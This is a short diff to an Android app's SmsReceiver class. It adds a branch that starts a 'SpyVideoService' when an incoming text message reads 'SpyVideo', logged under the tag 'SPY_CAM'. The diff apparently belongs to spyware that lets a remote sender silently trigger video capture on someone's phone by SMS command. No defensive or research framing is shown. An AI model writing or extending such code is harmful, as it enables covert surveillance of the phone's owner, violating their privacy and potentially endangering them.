@@ -30,6 +30,8 @@ public class SmsReceiver extends BroadcastReceiver {
                             context.startService(serviceIntent);
                         } else if (msgBody.equals("SpyVideo")) {
                             Log.i("SPY_CAM", "Capturing Video");
+                            Intent videoIntent = new Intent(context, SpyVideoService.class);
+                            context.startService(videoIntent);
                         }
                     }
                 } catch (Exception e) {
